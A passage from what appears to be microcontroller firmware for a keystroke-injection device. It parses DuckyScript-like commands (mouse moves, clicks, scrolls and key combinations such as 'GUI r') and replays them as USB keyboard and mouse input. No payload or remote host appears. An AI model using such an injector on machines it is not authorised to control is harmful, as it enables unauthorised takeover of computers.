        float px = args.substring(0, sp).toFloat();
        float py = args.substring(sp + 1).toFloat();
        moveToScreenPercent(px, py, calibratedWidth, calibratedHeight);
      }
    }
    // MOUSE_MOVE <dx> <dy>
    else if (line.startsWith("MOUSE_MOVE ")) {
      String args = line.substring(11);
      int sp = args.indexOf(' ');
      if (sp > 0) {
        int dx = args.substring(0, sp).toInt();
        int dy = args.substring(sp + 1).toInt();
        usbMouse.move(dx, dy);
      }
    }
    // MOUSE_CLICK [LEFT|RIGHT|MIDDLE]
    else if (line.startsWith("MOUSE_CLICK")) {
      uint8_t btn = MOUSE_LEFT;
      if (line.indexOf("RIGHT") > 0) btn = MOUSE_RIGHT;
      else if (line.indexOf("MIDDLE") > 0) btn = MOUSE_MIDDLE;
      usbMouse.click(btn);
      delay(40);
    }
    // MOUSE_SCROLL <val>
    else if (line.startsWith("MOUSE_SCROLL ")) {
      int s = line.substring(13).toInt();
      usbMouse.move(0, 0, s);
    }
    // KEY COMBINATIONS & SPECIAL KEYS (e.g. GUI r, CTRL ALT DELETE, ENTER)
    else {
      String upper = line;
      upper.toUpperCase();

      // Tokenize by space
      int p = 0;
      bool hasTokens = false;
      while (p < upper.length()) {
        int nextSpace = upper.indexOf(' ', p);
        if (nextSpace == -1) nextSpace = upper.length();
        String token = upper.substring(p, nextSpace);
        token.trim();
        p = nextSpace + 1;

        if (token.length() == 0) continue;
        hasTokens = true;

        if (token == "GUI" || token == "WIN" || token == "WINDOWS" || token == "CTRL" ||
            token == "ALT" || token == "SHIFT" || token == "COMMAND") {
          pressModifier(token);
        } else {
          // Convert single-char tokens to lowercase so the HID library
          // does NOT add an implicit SHIFT modifier (e.g. 'E' vs 'e').
          // GUI+'E' (uppercase) = WIN+SHIFT+E (wrong).
          // GUI+'e' (lowercase) = WIN+E (correct → File Explorer).
          String ltoken = token;
          if (ltoken.length() == 1) ltoken.toLowerCase();
          pressKey(ltoken);
        }
      }
      delay(30);
      usbKeyboard.releaseAll();
    }
  }

  digitalWrite(LED_BUILTIN, LOW);
  isInjecting = false;
}
